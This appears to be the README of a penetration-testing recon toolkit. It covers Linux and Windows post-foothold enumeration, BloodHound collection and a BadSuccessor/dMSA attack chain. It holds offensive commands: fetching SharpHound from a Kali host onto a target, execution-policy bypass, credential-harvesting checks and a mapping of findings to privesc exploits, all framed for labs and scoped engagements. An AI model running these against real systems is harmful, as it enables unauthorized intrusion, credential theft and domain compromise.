# Recon Automation Scripts

Five scripts. Three for on-host post-foothold enumeration (read-only), two for the BadSuccessor / dMSA chain.

> **NOT EDR-aware.** These scripts invoke nxc / kerbrute / SharpHound / bloodhound-ce-python — textbook EDR signatures (LDAP+SAMR volume, Kerberos 4768 spikes, SharpHound `--ZipFilename` on disk). Use on CPTS labs and engagement-scoped targets. For EDR-instrumented real-world hosts, switch to the pure-LOTL paths: [enumeration-methodology.md §1.2](../enumeration-methodology.md), [linux-methodology.md §3.3](../linux-methodology.md), [windows-methodology.md §4.1](../windows-methodology.md), and the `[adsisearcher]` / `runas /netonly` techniques in [active-directory-methodology.md](../active-directory-methodology.md). For in-memory tradecraft (AMSI/ETW patching, SGN encoding, donut), see [av-evasion.md](../av-evasion.md).

| Script | Purpose | When |
|---|---|---|
| [recon.py](recon.py) (default `--mode external`) | Kali-side external scanner — Phase 0-3 against a remote target | You only have an IP and need open ports + service enum |
| [recon.py](recon.py) `--mode host` | On-host post-foothold (Linux) — Python equivalent of recon.sh | Linux foothold with `python3` available |
| [recon.sh](recon.sh) | On-host post-foothold (Linux) — pure POSIX shell | Linux foothold without Python (busybox, minimal containers) |
| [recon.ps1](recon.ps1) | On-host post-foothold (Windows) — PowerShell 5.1 compatible | Any Windows foothold (PS 5.1 ships by default on Win10/11/Server 2016+) |
| [Get-dMSATicket.ps1](Get-dMSATicket.ps1) | Windows-side BadSuccessor / dMSA Rubeus wrapper | After CreateChild on OU + Server 2025 DC (active-directory-methodology.md §5.4) |
| [dmsa_exploit.sh](dmsa_exploit.sh) | Kali-side ticket → DCSync chain | Pair with Get-dMSATicket.ps1 base64 output |

---

## Output layout (all three on-host scripts)

```
./loot_<hostname>_<timestamp>/
├── summary.md          ← READ FIRST — priority findings + cross-refs to methodology
├── findings.txt        ← machine-readable hit list (used by summary.md)
├── system.txt          ← uname/systeminfo, identity, last logins
├── privesc.txt         ← sudo/SUID/caps (Linux) OR whoami /priv/AlwaysInstallElevated (Windows)
├── services.txt        ← cron/systemd OR scheduled tasks/Run keys
├── creds.txt           ← shell history, password-grep configs, SSH keys / cmdkey, SAM hives
├── network.txt         ← interfaces, routes, listening sockets, ARP, DNS
├── containers.txt      ← Docker/k8s indicators (Linux only)
├── shares.txt          ← NFS/SMB share state (Linux only)
├── domain.txt          ← join-state, klist, DC discovery (always written if domain-related artifacts)
├── domain_enum.txt     ← AD comprehensive read-only enum (only if domain-joined)
├── av.txt              ← Defender state + exclusions (Windows only)
├── apps.txt            ← WSUS/SCCM client config (Windows only)
└── bloodhound/
    ├── bh.zip          ← SharpHound CE / bloodhound-ce-python output (if collection succeeded)
    └── run.log         ← collection log + manual command if it didn't run
```

---

## Quick start — Linux foothold

```bash
# Python (preferred)
python3 recon.py --mode host

# Bash fallback (no Python required)
bash recon.sh

# Custom output dir
bash recon.sh /tmp/loot
```

## Quick start — Windows foothold

```powershell
# Default (no BloodHound collection — see below to enable)
powershell -ep bypass -f recon.ps1

# Custom output dir
powershell -ep bypass -f recon.ps1 -OutDir C:\temp\loot
```

---

## BloodHound ZIP export (no auto-ingest)

The scripts run a BloodHound **collector** (SharpHound on Windows, bloodhound-ce-python on Linux) and write the resulting JSON bundled into a single ZIP at `loot_*/bloodhound/bh.zip`. **Nothing is uploaded** — no connection to a BloodHound CE backend, no API calls, no `bloodhound-cli ingest`. You import the ZIP yourself via the BloodHound CE UI's **Administration → File Ingest → Upload** button.

Underlying commands the scripts run:
- Windows: `SharpHound.exe -c All --zipfilename bh.zip --outputdirectory <bh_dir>`
- Linux:   `bloodhound-ce-python -d <DOMAIN> -dc <DC> -c All --zip -ns <DC_IP>`

`-c All` is the collection-method flag (sessions, ACLs, trusts, GPOs, ADCS, etc.) — not a transport flag. Both tools only write to disk.

### Linux — bloodhound-ce-python

```bash
# 1. Install the collector once on Kali (or wherever you'll run from)
pipx install bloodhound-ce        # CE schema (recommended)
# OR  pip install bloodhound      # legacy schema

# 2. On the foothold: cache a Kerberos ticket OR set env vars
kinit <USER>@<DOMAIN>             # uses /etc/krb5.conf default_realm
# OR
export BLOODHOUND_USER='<USER>'
export BLOODHOUND_PASS='<PASS>'

# 3. Run recon — collector runs automatically and writes loot_*/bloodhound/bh.zip
python3 recon.py --mode host

# 4. Import the ZIP into BloodHound CE UI yourself (no auto-upload)
#    BloodHound CE → Administration → File Ingest → Upload  →  loot_*/bloodhound/*.zip
```

Auto-detection priority:
1. Cached Kerberos ticket (`klist -s`) → uses `-k --no-pass`
2. `BLOODHOUND_USER` + `BLOODHOUND_PASS` env vars → uses cleartext auth
3. Neither → logs the manual command to `bloodhound/run.log` and skips

### Windows — SharpHound CE via HTTP from Kali

Kali bundles SharpHound at `/usr/share/bloodhound-ce/collectors/SharpHound.exe`. Host it with one command:

```bash
# Kali side — HTTP server (preferred, works through proxies/firewalls)
sudo python3 -m http.server 80 --directory /usr/share/bloodhound-ce/collectors

# SMB fallback (only if HTTP egress is blocked)
sudo impacket-smbserver -smb2support sh /usr/share/bloodhound-ce/collectors
```

```powershell
# Windows target — set the URL, then run
$env:SHARPHOUND_URL = 'http://<KALI_IP>/SharpHound.exe'
# OR for SMB fallback:
$env:SHARPHOUND_URL = '\\<KALI_IP>\sh\SharpHound.exe'

powershell -ep bypass -f recon.ps1
```

Resolution order for SharpHound.exe:
1. `$env:SHARPHOUND_URL` (HTTP / SMB UNC / local path — all transparent)
2. `SharpHound.exe` in current directory
3. `SharpHound.exe` in `$PATH`

If none found, the script logs the manual command to `bloodhound\run.log` and continues.

---

## Comprehensive AD enumeration (domain-joined targets)

When the host is domain-joined, scripts dump `domain_enum.txt` with read-only queries. No active probing, no exploit attempts.

### Linux (recon.sh / recon.py --mode host)
- Anon LDAP rootDSE + naming contexts + user/computer probes
- `nxc smb` and `nxc ldap` null-session
- `nxc smb -M timeroast` (pre-Win2k computer accounts)
- `nxc ldap -M BadSuccessor` (dMSA prerequisites scan)
- `kerbrute userenum` (no-preauth, free hash for ASREPRoast candidates)
- DNS SRV records (`_ldap._tcp`, `_kerberos._tcp`, `_kpasswd._tcp`, `_gc._tcp`)
- AXFR attempt against the DC

### Windows (recon.ps1) — uses ADSI, no RSAT required
- 16 high-value group memberships (Domain Admins, Enterprise Admins, Schema Admins, Account/Backup/Server/Print Operators, DNSAdmins, Group Policy Creator Owners, Cert Publishers, Pre-Windows 2000, Protected Users, RDP/RM Users)
- User counts: total, disabled, `adminCount=1`, Kerberoastable, ASREPRoastable
- Per-user SPN list for Kerberoastable accounts (ready to feed `Rubeus.exe kerberoast`)
- `ms-DS-MachineAccountQuota` (RBCD/noPac/Certifried prereq)
- Computer accounts + OS versions
- Fine-Grained Password Policies (FGPP) with precedence + applies-to
- ADCS published CAs + certificate templates with `msPKI-Certificate-Name-Flag` / `msPKI-Enrollment-Flag` / EKUs (feeds `certipy find -vulnerable` interpretation)
- Domain trusts (LDAP `trustedDomain` — more verbose than `nltest /domain_trusts`)
- SYSVOL GPP cpassword sweep (Groups.xml / Services.xml / Scheduledtasks.xml etc.)
- GPO inventory (displayName + gpcfilesyspath)
- `gpresult /r` (effective policies for current user)

---

## Auto-flagged priority findings

The scripts add `[+]` HIT, `[!]` warn, `[i]` info entries to `findings.txt` and `summary.md`. Common flags:

**Linux:**
- `pkexec is SUID` → PwnKit candidate (CVE-2021-4034)
- `/etc/passwd|shadow|sudoers is WRITABLE` → direct privesc
- `sudo NOPASSWD entries` → check GTFOBins
- `writable systemd unit files` → service binary hijack
- `INSIDE Docker container` / `/var/run/docker.sock present` → escape paths
- `INSIDE Kubernetes pod with SA token` → kubeletctl / API access
- `/etc/exports has no_root_squash` → NFS-to-SUID-root
- `host appears domain-joined (sssd)` → AD pivot
- `BloodHound ZIP collected` / `BloodHound NOT collected`

**Windows:**
- `SeImpersonate / SeBackup / SeDebug enabled` → token-privilege abuse
- `AlwaysInstallElevated HKLM=1 AND HKCU=1` → instant SYSTEM via msiexec
- `service binaries with weak ACLs` → service hijack
- `UAC is DISABLED` (EnableLUA=0)
- `$N config files contain password/secret strings` → harvest
- `unattend/sysprep XML present` → AdministratorPassword
- `SYSVOL GPP cpassword found` → gpp-decrypt
- `SAM/SYSTEM hives readable` → reg save
- `WSUS configured over HTTP` → wsuxploit
- `host is DOMAIN-JOINED` (full AD enum runs)
- `MachineAccountQuota = N` → RBCD/noPac/Certifried primitive
- `N Kerberoastable accounts` (with SPN list ready)
- `N ASREPRoastable accounts` (no preauth)
- `ADCS CA published` → run `certipy find -vulnerable`
- `BloodHound ZIP collected` (path)

---

## Troubleshooting

**"BloodHound NOT collected" on Linux**
```bash
# Check 1: is bloodhound-ce-python installed?
which bloodhound-ce-python
# If missing:  pipx install bloodhound-ce

# Check 2: do you have a Kerberos ticket?
klist -s && echo "ticket cached" || echo "no ticket"
# If no ticket:  kinit <USER>@<DOMAIN>

# Check 3: re-read the manual command from run.log
cat loot_*/bloodhound/run.log
```

**"BloodHound NOT collected" on Windows**
```powershell
# Check 1: did the URL resolve?
Get-Content .\loot_*\bloodhound\run.log

# Check 2: test connectivity from the target to your Kali host
Invoke-WebRequest -Uri 'http://<KALI_IP>/SharpHound.exe' -UseBasicParsing -OutFile $env:TEMP\sh.exe -Verbose
# If 200 OK but recon.ps1 didn't fetch — check $env:SHARPHOUND_URL was set BEFORE running

# Check 3: SharpHound.exe might be flagged by Defender — check exclusions
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess
# If Defender deletes it: try the SMB UNC fallback or a recompiled SharpHound (av-evasion.md)
```

**Scripts hang on `find /` or `ldapsearch`**

The internal `cap()` / `run` helpers wrap commands with timeouts (Python defaults to 30-120s per stage). Bash uses native command behavior. If a stage hangs:
- Bash: `Ctrl-C` once — moves on to next stage. Output for that stage will be truncated.
- Python: timeout produces empty output for that section; script continues.

**ADSI queries fail on Windows ("server not operational")**

Possible causes:
1. Host is technically joined but DC unreachable (network split or pivot in use) — connect to DC first via `nltest /sc_query:<DOMAIN>`
2. Restricted group / Protected Users membership limiting LDAP searches — check `whoami /groups`
3. RSAT-style queries are NOT used — script uses `[DirectoryServices.DirectorySearcher]` directly, which works without RSAT but still needs LDAP reachability to a DC

---

## Existing dMSA / BadSuccessor scripts

[Get-dMSATicket.ps1](Get-dMSATicket.ps1) (Windows-side) and [dmsa_exploit.sh](dmsa_exploit.sh) (Kali-side) chain together for the BadSuccessor (CVE-2025-53779) attack. Cross-references in [active-directory-methodology.md §5.4](../active-directory-methodology.md). Both scripts are box-specific by default — review the hardcoded values at the top before running on a different target.

---

## Cross-references

- [../README.md](../README.md) — main methodology entry point + Day 0 setup, decision trees, reporting workflow
- [../linux-methodology.md](../linux-methodology.md) — Linux phases (privesc, creds, post-foothold)
- [../windows-methodology.md](../windows-methodology.md) — Windows phases (privesc, lateral movement, AD)
- [../active-directory-methodology.md](../active-directory-methodology.md) — AD attack chain (Phase 1-13)
- [../bloodhound-guide.md](../bloodhound-guide.md) — what to do AFTER `bh.zip` imports into BloodHound CE
- [../tunneling-pivoting.md](../tunneling-pivoting.md) — when recon flags multi-NIC / 127.0.0.1-only services
